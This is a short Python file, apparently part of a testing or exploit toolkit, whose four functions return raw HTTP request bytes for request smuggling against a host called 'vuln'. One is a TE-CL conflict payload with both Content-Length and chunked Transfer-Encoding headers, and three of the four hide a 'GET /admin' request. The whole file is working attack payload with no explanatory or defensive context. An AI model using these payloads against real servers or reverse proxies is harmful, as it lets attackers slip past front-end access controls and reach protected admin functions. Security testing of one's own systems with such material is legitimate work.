def get_basic_post():
    return b"POST / HTTP/1.1\r\nHost: vuln\r\nContent-Length: 13\r\n\r\n"

def get_overlapping_segment():
    # Overlaps previous POST body with a GET request
    return b"GET /admin HTTP/1.1\r\nHost: vuln\r\n\r\n"

def get_split_headers():
    headers = b"POST / HTTP/1.1\r\nHost: vuln\r\nContent-Length: 20\r\n\r\n"
    body = b"GET /admin HTTP/1.1\r\n\r\n"
    return headers, body

def get_smuggling_payload():
    # Basic TE-CL conflict payload (for reverse proxies)
    payload = (
        b"POST / HTTP/1.1\r\n"
        b"Host: vuln\r\n"
        b"Content-Length: 4\r\n"
        b"Transfer-Encoding: chunked\r\n\r\n"
        b"0\r\n\r\n"
        b"GET /admin HTTP/1.1\r\n"
        b"Host: vuln\r\n\r\n"
    )
    return payload
